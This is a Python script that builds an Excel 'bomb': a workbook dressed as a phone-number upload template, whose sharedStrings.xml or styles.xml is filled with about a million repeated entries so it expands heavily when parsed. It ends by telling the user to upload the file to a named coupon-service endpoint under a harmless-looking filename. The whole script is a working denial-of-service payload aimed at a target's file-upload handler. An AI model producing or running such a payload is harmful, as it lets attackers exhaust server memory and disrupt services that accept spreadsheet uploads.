import openpyxl
from openpyxl import Workbook
import zipfile
from io import BytesIO
import os
import time

# 配置
repeat_count = 1000000  # 总count
unique_count = 100  # 方法2: 唯一si数（小=文件小）
inject_styles = False  # True=方法3 (styles.xml)，False=方法2 (sharedStrings)

# 创建工作簿，保持原格式不变
wb = Workbook()
ws = wb.active
ws.title = "phone"
ws['A1'] = "手机号码"
ws['E1'] = "*填写须知：纵向填写，每行一个手机号"
ws['A2'] = "123456"

output = BytesIO()
wb.save(output)
output.seek(0)

with zipfile.ZipFile(output, 'r') as zin:
    with zipfile.ZipFile('bomb_shrunk.xlsx', 'w', zipfile.ZIP_DEFLATED) as zout:
        start_time = time.time()
        if inject_styles:
            # 方法3: 注入styles.xml
            for item in zin.infolist():
                if item.filename == 'xl/styles.xml':
                    xml_parts = []
                    xml_parts.append('<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" mcIgnorable="br" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:br="http://schemas.openxmlformats.org/spreadsheetml/2006/main">')
                    for i in range(repeat_count):
                        xml_parts.append('<xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>')
                    xml_parts.append('</styleSheet>')
                    bomb_content = ''.join(xml_parts)
                    zout.writestr(item, bomb_content.encode('utf-8'))
                else:
                    zout.writestr(item, zin.read(item.filename))
            print("Injected to styles.xml")
        else:
            # 方法2: sharedStrings重复si
            shared_found = False
            for item in zin.infolist():
                if item.filename == 'xl/sharedStrings.xml':
                    shared_found = True
                    xml_parts = []
                    xml_parts.append('<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="{count}" uniqueCount="{unique}">'.format(count=repeat_count, unique=unique_count))
                    for i in range(unique_count):
                        xml_parts.append(f'<si><t>A{i}</t></si>')
                    # 重复块：count / unique 次
                    repeats = repeat_count // unique_count
                    for _ in range(repeats):
                        for i in range(unique_count):
                            xml_parts.append(f'<si><t>A{i}</t></si>')
                    xml_parts.append('</sst>')
                    bomb_content = ''.join(xml_parts)
                    zout.writestr(item, bomb_content.encode('utf-8'))
                else:
                    zout.writestr(item, zin.read(item.filename))
            
            if not shared_found:
                # 同上，强制添加
                xml_parts = []
                xml_parts.append('<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="{count}" uniqueCount="{unique}">'.format(count=repeat_count, unique=unique_count))
                for i in range(unique_count):
                    xml_parts.append(f'<si><t>A{i}</t></si>')
                repeats = repeat_count // unique_count
                for _ in range(repeats):
                    for i in range(unique_count):
                        xml_parts.append(f'<si><t>A{i}</t></si>')
                xml_parts.append('</sst>')
                bomb_content = ''.join(xml_parts)
                zout.writestr('xl/sharedStrings.xml', bomb_content.encode('utf-8'))
            print("Injected to sharedStrings.xml with repeats")

print(f"Generated bomb_shrunk.xlsx (inflated to {repeat_count} entries)")
print("Upload to /eos/coupon/sendCoupon/uploadFile as 'phone - 副本.xlsx'")

# 验证（同前）
loaded_wb = openpyxl.load_workbook('bomb_shrunk.xlsx')
loaded_ws = loaded_wb.active
print("Verification:")
print(f"A1: '{loaded_ws['A1'].value}'")
print(f"E1: '{loaded_ws['E1'].value}'")
print(f"A2: '{loaded_ws['A2'].value}'")

file_size = os.path.getsize('bomb_shrunk.xlsx')
print(f"File size: {file_size} bytes")

# 检查注入文件大小
with zipfile.ZipFile('bomb_shrunk.xlsx', 'r') as zf:
    target_file = 'xl/styles.xml' if inject_styles else 'xl/sharedStrings.xml'
    if target_file in zf.namelist():
        target_size = len(zf.read(target_file))
        print(f"{target_file} compressed size: {target_size} bytes")

loaded_data = openpyxl.load_workbook('bomb_shrunk.xlsx', data_only=True)
loaded_data_ws = loaded_data.active
print("Data-only load:")
print(f"A1: '{loaded_data_ws['A1'].value}'")
print(f"E1: '{loaded_data_ws['E1'].value}'")
print(f"A2: '{loaded_data_ws['A2'].value}'")